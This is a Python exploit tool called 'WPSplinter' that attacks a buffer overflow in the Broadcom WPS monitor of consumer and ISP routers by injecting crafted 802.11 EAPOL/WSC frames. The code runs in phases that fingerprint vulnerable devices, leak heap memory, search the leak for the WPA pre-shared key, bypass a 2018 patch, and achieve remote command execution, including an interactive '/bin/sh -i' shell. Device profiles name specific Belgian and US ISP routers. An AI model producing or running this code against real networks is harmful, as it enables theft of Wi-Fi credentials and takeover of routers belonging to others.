#!/usr/bin/env python3

import argparse
import logging
import os
import struct
import subprocess
import sys
import time

from scapy.all import (
    LLC,
    SNAP,
    Dot11,
    Dot11Auth,
    Dot11Elt,
    RadioTap,
    RandMAC,
    Raw,
    conf,
    sendp,
    sniff,
    wrpcap,
)
from scapy.layers.dot11 import Dot11AssoReq, Dot11AssoResp, Dot11Deauth, Dot11Disas

ETH_P_PAE = 0x888E
MAC_FRAGMENT_SIZE = 235

logging.basicConfig(
    level=logging.INFO,
    format="[%(asctime)s] %(levelname)s: %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger("wpsplinter")
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

EAP_CODE_REQUEST, EAP_CODE_RESPONSE = 1, 2
EAP_CODE_SUCCESS, EAP_CODE_FAILURE = 3, 4
EAP_TYPE_IDENTITY = 1
EAP_TYPE_EXPANDED = 254

EAPOL_START_BYTES = b"\x02\x01\x00\x00"
EAPOL_VERSION_EAP = 0x01
EAPOL_TYPE_EAP = 0x00

WPS_VENDOR = b"\x00\x37\x2a"
WPS_VENDOR_TYPE = b"\x00\x00\x00\x01"

WSC_OP_START = 0x01
WSC_OP_ACK = 0x02
WSC_OP_NACK = 0x03
WSC_OP_MSG_M1 = 0x04
WSC_OP_M2 = 0x05
WSC_OP_M2D = 0x06

WSC_OP_FRAG_ACK_CANDIDATES = (0x03, 0x0F)

WSC_FLAG_MF = 0x01
WSC_FLAG_LF = 0x02

WFA_IDENTITY = b"wfa-simpleconfig-enrollee-1-0"

FRAGS_CAP = 2048
OFF_TOTAL_BYTES = FRAGS_CAP
OFF_TOTAL_RECV = FRAGS_CAP + 4
OFF_NEXT_FRAG = FRAGS_CAP + 8
OFF_FRAG_SIZE = FRAGS_CAP + 12
OFF_FLAGS = FRAGS_CAP + 24
OFF_LAST_SENT = FRAGS_CAP + 28
OFF_LAST_SENT_LEN = FRAGS_CAP + 32
OFF_SEND_DATA = FRAGS_CAP + 56

PSK_MIN_LEN, PSK_MAX_LEN = 8, 63
PSK_MARKERS = [b"wpa_psk", b"wpa_passphrase", b"pre_shared_key", b"psk=", b"WPA PSK"]
PSK_SCAN_OFFSETS = [0x1000, 0x2000, 0x3000, 0x4000, 0x5000]

DEVICE_PROFILES = {

    "bbox3v": ("mips", "big", None, "Sagemcom/Proximus BBOX 3V+"),
    "tcg3000": ("arm", "little", None, "ASKEY TCG3000 (Orange BE)"),
    "cg3100": ("mips", "big", None, "Netgear CG3100 (VOO)"),
    "cg3700": ("mips", "big", None, "Netgear CG3700 (VOO)"),
    "tc7210": ("arm", "little", None, "Technicolor TC7210 (VOO)"),
    "cga4233": ("arm", "little", None, "Technicolor CGA4233 (VOO)"),
    "actiontec": ("arm", "little", None, "Actiontec C1000A/C3000A (CenturyLink)"),
    "generic-arm": ("arm", "little", None, "Generic: BCM3390/68xx Linux"),
    "generic-mips": ("mips", "big", None, "Generic: BCM3380/3383 eCos"),
}

SHELL_CMD = b"/bin/sh -i\x00"

def build_eapol(
    eap_body: bytes, version: int = EAPOL_VERSION_EAP, ptype: int = EAPOL_TYPE_EAP
) -> bytes:

    return struct.pack(">BBH", version, ptype, len(eap_body)) + eap_body

def build_eap(code: int, identifier: int, payload_after_type: bytes) -> bytes:

    length = 4 + 1 + len(payload_after_type)
    return (
        struct.pack(">BBHB", code, identifier, length, EAP_TYPE_EXPANDED)
        + payload_after_type
    )

def build_identity_response(identifier: int) -> bytes:

    length = 5 + len(WFA_IDENTITY)
    eap = (
        struct.pack(">BBHB", EAP_CODE_RESPONSE, identifier, length, EAP_TYPE_IDENTITY)
        + WFA_IDENTITY
    )
    return build_eapol(eap)

def build_wsc_response(identifier: int, flags: int, data: bytes) -> bytes:

    length = 14 + len(data)
    eap = (
        struct.pack(">BBHB", EAP_CODE_RESPONSE, identifier, length, EAP_TYPE_EXPANDED)
        + WPS_VENDOR
        + WPS_VENDOR_TYPE
        + struct.pack(">BB", WSC_OP_MSG_M1, flags)
        + data
    )
    return build_eapol(eap)

class ApEap:

    __slots__ = ("code", "identifier", "raw", "opcode", "flags", "lf", "wsc_data")

    def __init__(self, code, identifier, eap):
        self.code, self.identifier, self.raw = code, identifier, eap
        self.opcode = self.flags = self.lf = None
        self.wsc_data = b""
        if (
            len(eap) >= 14
            and eap[4] == EAP_TYPE_EXPANDED
            and eap[5:8] == WPS_VENDOR
            and eap[8:12] == WPS_VENDOR_TYPE
        ):
            self.opcode = eap[12]
            self.flags = eap[13]
            pos = 14
            if self.flags & WSC_FLAG_LF:
                if len(eap) < pos + 2:
                    return
                self.lf = int.from_bytes(eap[pos : pos + 2], "big")
                pos += 2
            self.wsc_data = eap[pos:]

def parse_eapol(eapol: bytes):

    if len(eapol) < 8 or eapol[1] != 0:
        return None
    eapol_length = int.from_bytes(eapol[2:4], "big")
    eap = eapol[4 : 4 + eapol_length]
    if len(eap) < 4:
        return None
    declared = int.from_bytes(eap[2:4], "big")
    if declared < 4 or len(eap) < declared:
        return None
    return eap[0], eap[1], eap[:declared]

WSC_TLV_VERSION = 0x104A
WSC_TLV_MSG_TYPE = 0x1022
WSC_TLV_UUID_E = 0x1047
WSC_TLV_MAC_ADDR = 0x1020
WSC_TLV_NONCE = 0x101A
WSC_TLV_PUBLIC_KEY = 0x1032
WSC_TLV_AUTH_FLAGS = 0x1003
WSC_TLV_ENCR_FLAGS = 0x100F
WSC_TLV_CONN_FLAGS = 0x1007
WSC_TLV_CONFIG_METH = 0x1008
WSC_TLV_RF_BANDS = 0x103C
WSC_TLV_ASSOC_STATE = 0x1002
WSC_TLV_DEVICE_NAME = 0x1011
WSC_TLV_REQUEST_T = 0x103A

def build_wsc_m1(sta_mac: bytes) -> bytes:

    tlvs = b""

    def tlv(t, v):
        return struct.pack(">HH", t, len(v)) + v

    tlvs += tlv(WSC_TLV_VERSION, b"\x10")
    tlvs += tlv(WSC_TLV_MSG_TYPE, b"\x04")
    tlvs += tlv(WSC_TLV_UUID_E, os.urandom(16))
    tlvs += tlv(WSC_TLV_MAC_ADDR, sta_mac)
    tlvs += tlv(WSC_TLV_NONCE, os.urandom(16))
    tlvs += tlv(WSC_TLV_PUBLIC_KEY, b"\x11" * 192)
    tlvs += tlv(WSC_TLV_AUTH_FLAGS, struct.pack(">H", 0x0020))
    tlvs += tlv(WSC_TLV_ENCR_FLAGS, struct.pack(">H", 0x0008))
    tlvs += tlv(WSC_TLV_CONN_FLAGS, b"\x01")
    tlvs += tlv(WSC_TLV_CONFIG_METH, struct.pack(">H", 0x0008))
    tlvs += tlv(WSC_TLV_RF_BANDS, b"\x01")
    tlvs += tlv(WSC_TLV_ASSOC_STATE, struct.pack(">H", 0))
    tlvs += tlv(WSC_TLV_DEVICE_NAME, b"wpsplinter")
    tlvs += tlv(WSC_TLV_REQUEST_T, b"\x00")
    return tlvs

class OverflowPayload:

    def __init__(self):
        self.buffer = bytearray(FRAGS_CAP)
        self.overflow = {}

    def set_buffer_data(self, offset: int, data: bytes):
        end = offset + len(data)
        if offset < 0:
            raise ValueError("offset < 0")
        if end > FRAGS_CAP:
            raise ValueError("buffer data exceeds FRAGS_CAP")
        self.buffer[offset:end] = data

    def write_overflow(self, rel_offset: int, data: bytes):
        if rel_offset < FRAGS_CAP:
            raise ValueError(f"overflow offset must be >= {FRAGS_CAP}")
        self.overflow[rel_offset] = data

    def build(self) -> bytes:
        if not self.overflow:
            return bytes(self.buffer)
        max_end = max(off + len(d) for off, d in self.overflow.items())
        region = bytearray(b"\x00" * (max_end - FRAGS_CAP))
        for off, d in self.overflow.items():
            pos = off - FRAGS_CAP
            region[pos : pos + len(d)] = d
        return bytes(self.buffer) + bytes(region)

class WPSplinter:
    def __init__(
        self,
        interface,
        bssid,
        ssid,
        channel=None,
        arch="arm",
        big_endian=False,
        system_plt=None,
        off_total_bytes=OFF_TOTAL_BYTES,
        off_last_sent_len=OFF_LAST_SENT_LEN,
        off_send_data=OFF_SEND_DATA,
        dump=None,
        verbose=False,
        debug=False,
    ):
        self.iface = interface
        self.bssid = bssid.lower()
        self.ssid = ssid.encode() if isinstance(ssid, str) else ssid
        self.channel = channel
        self.arch = arch
        self.big_endian = big_endian
        self.system_plt = system_plt
        self.OFF_TOTAL = off_total_bytes
        self.OFF_LAST_SENT_LEN = off_last_sent_len
        self.OFF_SEND_DATA = off_send_data
        self.dump = dump
        self.packfmt = ">I" if big_endian else "<I"

        self.sta = str(RandMAC()).lower()
        self.seq = 0
        self.assoc_ok = False
        self.rx_seen = set()
        self.packets = []

        logger.setLevel(
            logging.DEBUG if debug else logging.INFO if verbose else logging.WARNING
        )
        conf.iface = interface
        logger.info(
            f"[*] iface={interface} bssid={self.bssid} "
            f"ssid={self.ssid.decode(errors='replace')} arch={arch}"
        )

    def log(self, msg):
        logger.info(msg)

    def _next_seq(self):
        self.seq = (self.seq + 1) & 0xFFF
        return self.seq

    def _mgmt(self, subtype):
        return RadioTap() / Dot11(
            type=0, subtype=subtype, addr1=self.bssid, addr2=self.sta, addr3=self.bssid
        )

    def _data_frame(self, eapol: bytes):

        return (
            RadioTap()
            / Dot11(
                type=2,
                subtype=0,
                FCfield=0x01,
                addr1=self.bssid,
                addr2=self.sta,
                addr3=self.bssid,
                SC=self._next_seq() << 4,
            )
            / LLC(dsap=0xAA, ssap=0xAA, ctrl=3)
            / SNAP(OUI=0, code=ETH_P_PAE)
            / Raw(eapol)
        )

    def _tx(self, eapol: bytes):

        pkt = self._data_frame(eapol)
        payload = bytes(pkt[Dot11].payload)
        seq = self._next_seq() & 0xFFF
        if len(payload) <= MAC_FRAGMENT_SIZE:
            pkt[Dot11].SC = seq << 4
            sendp(pkt, iface=self.iface, count=1, verbose=False)
            self.packets.append(pkt)
            return
        header = pkt.getlayer(Dot11).copy()
        header.remove_payload()
        frags = []
        for off in range(0, len(payload), MAC_FRAGMENT_SIZE):
            chunk = payload[off : off + MAC_FRAGMENT_SIZE]
            fh = header.copy()
            flags = int(fh.FCfield)
            if off + len(chunk) < len(payload):
                flags |= 0x04
            else:
                flags &= ~0x04
            fh.FCfield = flags
            fh.SC = (seq << 4) | (off // MAC_FRAGMENT_SIZE)
            frags.append(RadioTap() / fh / Raw(chunk))
        for f in frags:
            sendp(f, iface=self.iface, count=1, inter=0.002, verbose=False)
            self.packets.append(f)

    def _rx(self, timeout=3.0, want_any=False):

        station, bssid = self.sta, self.bssid

        def wanted(p):
            if p.haslayer(Dot11Deauth) or p.haslayer(Dot11Disas):
                return (
                    str(p[Dot11].addr1 or "").lower() == station
                    and str(p[Dot11].addr2 or "").lower() == bssid
                )
            if not p.haslayer(Dot11) or not p.haslayer(SNAP):
                return False
            d = p[Dot11]
            if (
                str(d.addr1 or "").lower() != station
                or str(d.addr2 or "").lower() != bssid
                or int(p[SNAP].code) != ETH_P_PAE
            ):
                return False
            parsed = parse_eapol(bytes(p[SNAP].payload))
            if parsed is None:
                return False
            eap = parsed[2]
            if not want_any and eap in self.rx_seen:
                return False
            self.rx_seen.add(eap)
            return True

        res = sniff(
            count=1,
            timeout=timeout,
            iface=self.iface,
            lfilter=wanted,
            store=True,
            verbose=0,
        )
        if not res:
            return None
        p = res[0]
        if p.haslayer(Dot11Deauth):
            raise StationStateLost("deauth", int(p[Dot11Deauth].reason))
        if p.haslayer(Dot11Disas):
            raise StationStateLost("disassoc", int(p[Dot11Disas].reason))
        code, ident, eap = parse_eapol(bytes(p[SNAP].payload))
        return ApEap(code, ident, eap)

    def _check_monitor(self):
        try:
            out = subprocess.run(
                ["iw", "dev", self.iface, "info"],
                capture_output=True,
                text=True,
                timeout=5,
            )
            if "type monitor" not in out.stdout:
                logger.warning("[!] Interface is not in monitor mode")
        except Exception as e:
            logger.debug(f"iw check failed: {e}")

    def set_channel(self, channel):
        subprocess.run(
            ["iw", "dev", self.iface, "set", "channel", str(channel)], check=False
        )
        self.channel = channel

    def associate(self):

        self._check_monitor()
        if self.channel:
            self.set_channel(self.channel)

        sendp(
            RadioTap() / self._mgmt(11) / Dot11Auth(algo=0, seqnum=1, status=0),
            iface=self.iface,
            count=1,
            verbose=0,
        )
        t_end = time.monotonic() + 3.0
        auth_ok = False
        while time.monotonic() < t_end:
            res = sniff(
                count=1,
                timeout=0.8,
                iface=self.iface,
                lfilter=lambda p: (
                    p.haslayer(Dot11Auth) and str(p[Dot11].addr1).lower() == self.sta
                ),
                store=1,
                verbose=0,
            )
            if res and int(res[0][Dot11Auth].status) == 0:
                auth_ok = True
                break
        if not auth_ok:
            logger.warning("[-] No successful authentication response (continuing)")
        else:
            self.log("[+] Authentication successful")

        assoc = (
            self._mgmt(0)
            / Dot11AssoReq(cap=0x0431, listen_interval=3)
            / Dot11Elt(ID="SSID", info=self.ssid)
            / Dot11Elt(ID="Rates", info=b"\x82\x84\x8b\x96\x0c\x12\x18\x24")
            / Dot11Elt(ID="DSset", info=bytes([self.channel or 6]))
        )
        assoc[Dot11].SC = self._next_seq() << 4
        sendp(assoc, iface=self.iface, count=1, verbose=0)
        self.packets.append(assoc)

        t_end = time.monotonic() + 3.0
        while time.monotonic() < t_end:
            res = sniff(
                count=1,
                timeout=0.8,
                iface=self.iface,
                lfilter=lambda p: (
                    p.haslayer(Dot11AssoResp)
                    and str(p[Dot11].addr1).lower() == self.sta
                ),
                store=1,
                verbose=0,
            )
            if res:
                if int(res[0][Dot11AssoResp].status) == 0:
                    self.log("[+] Association successful")
                    self.assoc_ok = True
                    return True
                logger.error(
                    f"[-] Association rejected "
                    f"(status={res[0][Dot11AssoResp].status})"
                )
                return False
        logger.warning("[-] No association response (continuing)")
        self.assoc_ok = True
        return True

    def start_wps(self) -> int:

        self.rx_seen = set()
        self._tx(EAPOL_START_BYTES)
        deadline = time.monotonic() + 10.0
        while time.monotonic() < deadline:
            try:
                ap = self._rx(timeout=2.0, want_any=True)
            except StationStateLost:
                raise
            if ap is None:
                self._tx(EAPOL_START_BYTES)
                continue
            if (
                ap.code == EAP_CODE_REQUEST
                and len(ap.raw) >= 5
                and ap.raw[4] == EAP_TYPE_IDENTITY
            ):
                self._tx(build_identity_response(ap.identifier))
                continue
            if (
                ap.code == EAP_CODE_REQUEST
                and len(ap.raw) >= 14
                and ap.raw[12] == WSC_OP_START
            ):
                self.log(f"[+] WPS session active (identifier={ap.identifier})")
                return ap.identifier
        raise WpsError("WPS initiation failed (timeout)")

    def send_wsc(self, identifier, flags, data, retransmits=3):

        frame = build_wsc_response(identifier, flags, data)
        for attempt in range(retransmits):
            self._tx(frame)
            try:
                ap = self._rx(timeout=2.5)
            except StationStateLost as e:
                return ("LOST", e)
            if ap is not None:
                return ("EAP", ap)
        return ("TIMEOUT", None)

    def phase_fingerprint(self) -> bool:

        self.log("[*] Phase 1: Fingerprinting (zero-length differential)...")
        if not self.assoc_ok and not self.associate():
            return False
        ident = self.start_wps()

        data = struct.pack(">H", 0)
        result = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF, data)
        kind, payload = result

        if kind == "LOST" and getattr(payload, "reason", None) == 0:
            self.log("[+] Deauth reason=0 -> wps_monitor -> LIKELY_VULNERABLE")
            return True
        if kind != "EAP":
            self.log("[-] No response -> INCONCLUSIVE")
            return False
        ap = payload
        if ap.code == EAP_CODE_FAILURE:
            self.log(
                "[+] EAP-Failure for total=0 -> wps_monitor -> "
                "LIKELY_VULNERABLE [10]"
            )
            return True
        if ap.opcode is not None and ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES:
            self.log("[-] FRAG-ACK received -> hostapd-based -> PATCHED [10]")
            return False
        if ap.opcode == WSC_OP_NACK:
            self.log("[+] WSC-NACK -> wps_monitor -> LIKELY_VULNERABLE")
            return True
        self.log("[?] Unexpected response -> INCONCLUSIVE")
        return False

    def phase_vuln_probe(self) -> bool:

        self.log("[*] Phase 1b: Overflow capability probe (oversized total)...")
        if not self.assoc_ok and not self.associate():
            return False
        ident = self.start_wps()
        total = FRAGS_CAP + 512
        data = struct.pack(">H", total & 0xFFFF) + b"\x41" * 256
        kind, payload = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF, data)
        if kind == "EAP" and payload.opcode in WSC_OP_FRAG_ACK_CANDIDATES:
            self.log(
                f"[+] FRAG-ACK for total={total} -> Reassembly accepted "
                "oversized length -> vulnerable"
            )
            return True
        self.log(
            "[-] No FRAG-ACK for oversized total -> possibly 2018 patch or hostapd"
        )
        return False

    def phase_leak(self, target_offset=0, leak_size=1024) -> bytes:

        self.log(f"[*] Phase 2: Leak {leak_size} B starting at buffer...")
        if not self.assoc_ok and not self.associate():
            return b""
        ident = self.start_wps()

        ov = OverflowPayload()
        ov.set_buffer_data(0, b"\x41" * FRAGS_CAP)
        ov.write_overflow(
            self.OFF_TOTAL, struct.pack(self.packfmt, FRAGS_CAP + leak_size)
        )
        ov.write_overflow(OFF_TOTAL_RECV, struct.pack(self.packfmt, 0))
        ov.write_overflow(
            self.OFF_LAST_SENT_LEN, struct.pack(self.packfmt, FRAGS_CAP + leak_size)
        )
        payload = ov.build()

        sent_by_us = {bytes(payload)}
        kind, ap = self.send_wsc(
            ident,
            WSC_FLAG_LF | WSC_FLAG_MF,
            struct.pack(">H", len(payload) & 0xFFFF) + payload[:1024],
        )
        if kind != "EAP" or not (ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES):
            self.log("[-] First fragment not acknowledged")
            return b""

        rest = payload[1024:]
        kind, ap = self.send_wsc(ident, WSC_FLAG_MF, rest)
        if kind != "EAP":
            self.log("[-] Continuation not acknowledged")
            return b""

        collected = b""
        t_end = time.monotonic() + 5.0
        while time.monotonic() < t_end:
            try:
                ap = self._rx(timeout=1.5)
            except StationStateLost:
                break
            if ap is None:
                break
            d = ap.wsc_data
            if d and bytes(d) not in sent_by_us:
                collected += bytes(d)
        self.log(f"[+] {len(collected)} B of response data (potential leak)")
        return collected

    def scan_for_psk(self, memory: bytes) -> list:
        out = []
        for marker in PSK_MARKERS:
            pos = memory.find(marker)
            while pos != -1:
                window = memory[pos + len(marker) : pos + len(marker) + 128]
                nul = window.find(b"\x00")
                cand = window if nul == -1 else window[:nul]
                if PSK_MIN_LEN <= len(cand) <= PSK_MAX_LEN:
                    try:
                        t = cand.decode("ascii")
                        if all(32 <= ord(c) <= 126 for c in t):
                            out.append(t)
                    except UnicodeDecodeError:
                        pass
                pos = memory.find(marker, pos + 1)
        return sorted(set(out))

    def phase_extract_psk(self, scan_size=4096, base_offset=0) -> list:
        self.log("[*] Phase 3: PSK extraction...")
        found = []
        offsets = [base_offset] if base_offset else PSK_SCAN_OFFSETS
        for off in offsets:
            data = self.phase_leak(target_offset=off, leak_size=scan_size)
            if data:
                found.extend(self.scan_for_psk(data))
        found = sorted(set(found))
        if found:
            print("=" * 60)
            print("PSK CANDIDATES (verify with wpa_passphrase <SSID> <PSK>):")
            for i, p in enumerate(found, 1):
                print(f"  [{i}] {p}")
            print("=" * 60)
        else:
            self.log("[-] No PSK candidates found")
        return found

    def phase_rce(self, cmd: bytes, system_plt=None) -> bool:

        if isinstance(cmd, str):
            cmd = cmd.encode()
        if not cmd.endswith(b"\x00"):
            cmd += b"\x00"
        plt = system_plt or self.system_plt
        if not plt:
            raise WpsError("RCE requires --system_plt (firmware-specific!)")
        self.log(f"[*] Phase 4: RCE cmd={cmd!r} system@{plt:#x}")

        if not self.assoc_ok and not self.associate():
            return False
        ident = self.start_wps()

        ov = OverflowPayload()
        ov.set_buffer_data(0, cmd)
        ov.write_overflow(self.OFF_SEND_DATA, struct.pack(self.packfmt, plt))
        payload = ov.build()

        kind, ap = self.send_wsc(
            ident,
            WSC_FLAG_LF | WSC_FLAG_MF,
            struct.pack(">H", len(payload) & 0xFFFF) + payload[:1024],
        )
        if kind != "EAP" or not (ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES):
            self.log("[-] First fragment not acknowledged")
            return False
        rest = payload[1024:]
        send_wsc_kwargs = dict(ident=ident)
        frame = build_wsc_response(ident, WSC_FLAG_MF, rest)
        self._tx(frame)
        self.log("[*] Overflow sent — waiting for retransmission timer...")
        time.sleep(6)
        self.log("[+] RCE payload sent")
        return True

    def phase_shell(self):
        return self.phase_rce(SHELL_CMD)

    def phase_m2d_leak(self) -> bytes:

        self.log("[*] Phase: M2D overread...")
        if not self.assoc_ok and not self.associate():
            return b""
        ident = self.start_wps()
        m1 = build_wsc_m1(bytes.fromhex(self.sta.replace(":", "")))
        self._tx(build_wsc_response(ident, 0, m1))
        collected = b""
        t_end = time.monotonic() + 6.0
        while time.monotonic() < t_end:
            try:
                ap = self._rx(timeout=1.5)
            except StationStateLost:
                break
            if ap is None:
                break
            if ap.opcode in (WSC_OP_M2, WSC_OP_M2D):
                collected += ap.wsc_data
                self.log(f"[+] M2/M2D received ({len(ap.wsc_data)} B)")
        return collected

    def phase_bypass_2018(self) -> bool:

        self.log("[*] Phase: 2018 patch bypass (integer underflow) [2]...")
        if not self.assoc_ok and not self.associate():
            return False
        ident = self.start_wps()
        data = struct.pack(">H", 0xFFFF) + b"\x41" * 512
        kind, ap = self.send_wsc(ident, WSC_FLAG_LF | WSC_FLAG_MF, data)
        if kind == "EAP" and ap.opcode in WSC_OP_FRAG_ACK_CANDIDATES:
            self.log("[+] FRAG-ACK for total=0xFFFF — patch bypass active")
            return True
        self.log("[-] No FRAG-ACK — possibly fully patched or hostapd")
        return False

    def hexdump(self, data, width=16):
        for off in range(0, len(data), width):
            chunk = data[off : off + width]
            hexs = " ".join(f"{b:02x}" for b in chunk)
            txt = "".join(chr(b) if 32 <= b <= 126 else "." for b in chunk)
            print(f"  {off:08x}  {hexs:<{width*3}}  {txt}")

    def close(self):
        if self.dump and self.packets:
            wrpcap(self.dump, self.packets)
            logger.info(f"[+] {len(self.packets)} packets -> {self.dump}")

class StationStateLost(Exception):
    def __init__(self, action, reason):
        super().__init__(f"station state lost: {action} reason={reason}")
        self.action, self.reason = action, reason

class WpsError(Exception):
    pass

def main():
    ap = argparse.ArgumentParser(
        description="WPSplinter v8 — Broadcom WPS Monitor Exploit",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Phases:
  fingerprint     Non-invasive zero-length differential fingerprint [10]
  vuln_probe      Oversized-total probe (FRAG-ACK => vulnerable reassembly)
  leak            last_sent_len overflow -> memory disclosure
  extract_psk     Scan heap for PSK
  m2d_leak        M2D integer overread [2]
  bypass_2018     Integer underflow against the 2018 patch [2]
  rce             send_data = system@plt (requires --system_plt!)
  shell           RCE with /bin/sh -i

Note: No CVE has been assigned to this vulnerability [1].
""",
    )
    ap.add_argument("--iface", required=True)
    ap.add_argument("--bssid", required=True)
    ap.add_argument("--ssid", required=True)
    ap.add_argument("--channel", type=int)
    ap.add_argument(
        "--phase",
        required=True,
        choices=[
            "fingerprint",
            "vuln_probe",
            "leak",
            "extract_psk",
            "m2d_leak",
            "bypass_2018",
            "rce",
            "shell",
        ],
    )
    ap.add_argument(
        "--profile",
        choices=sorted(DEVICE_PROFILES),
        help="Device profile (sets architecture/endianness defaults)",
    )
    ap.add_argument("--arch", choices=["arm", "mips"], default=None)
    ap.add_argument(
        "--system_plt",
        type=lambda x: int(x, 0),
        default=None,
        help="system@PLT (hex) — required for rce/shell",
    )
    ap.add_argument("--cmd", default="id;#")
    ap.add_argument(
        "--off_total_bytes", type=lambda x: int(x, 0), default=OFF_TOTAL_BYTES
    )
    ap.add_argument(
        "--off_last_sent_len", type=lambda x: int(x, 0), default=OFF_LAST_SENT_LEN
    )
    ap.add_argument("--off_send_data", type=lambda x: int(x, 0), default=OFF_SEND_DATA)
    ap.add_argument("--psk_offset", type=lambda x: int(x, 0), default=0)
    ap.add_argument("--psk_size", type=int, default=4096)
    ap.add_argument("--leak_size", type=int, default=1024)
    ap.add_argument("--dump", default=None)
    ap.add_argument("-v", "--verbose", action="store_true")
    ap.add_argument("-d", "--debug", action="store_true")
    args = ap.parse_args()

    arch, big_endian, plt_default, _note = DEVICE_PROFILES.get(
        args.profile, ("arm", "little", None, "")
    )
    if args.arch:
        arch = args.arch
        big_endian = arch == "mips"
    if not args.profile and not args.arch:
        arch, big_endian = "arm", False

    w = WPSplinter(
        interface=args.iface,
        bssid=args.bssid,
        ssid=args.ssid,
        channel=args.channel,
        arch=arch,
        big_endian=big_endian,
        system_plt=args.system_plt or plt_default,
        off_total_bytes=args.off_total_bytes,
        off_last_sent_len=args.off_last_sent_len,
        off_send_data=args.off_send_data,
        dump=args.dump,
        verbose=args.verbose,
        debug=args.debug,
    )

    rc = 2
    try:
        if args.phase == "fingerprint":
            rc = 0 if w.phase_fingerprint() else 1
        elif args.phase == "vuln_probe":
            rc = 0 if w.phase_vuln_probe() else 1
        elif args.phase == "leak":
            data = w.phase_leak(leak_size=args.leak_size)
            if data:
                w.hexdump(data)
            rc = 0 if data else 1
        elif args.phase == "extract_psk":
            psks = w.phase_extract_psk(
                scan_size=args.psk_size, base_offset=args.psk_offset
            )
            rc = 0 if psks else 1
        elif args.phase == "m2d_leak":
            data = w.phase_m2d_leak()
            if data:
                w.hexdump(data)
            rc = 0 if data else 1
        elif args.phase == "bypass_2018":
            rc = 0 if w.phase_bypass_2018() else 1
        elif args.phase == "rce":
            rc = 0 if w.phase_rce(args.cmd) else 1
        elif args.phase == "shell":
            rc = 0 if w.phase_shell() else 1
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        rc = 130
    except (WpsError, StationStateLost) as e:
        print(f"[!] {e}")
        rc = 2
    finally:
        w.close()
    sys.exit(rc)

if __name__ == "__main__":
    main()
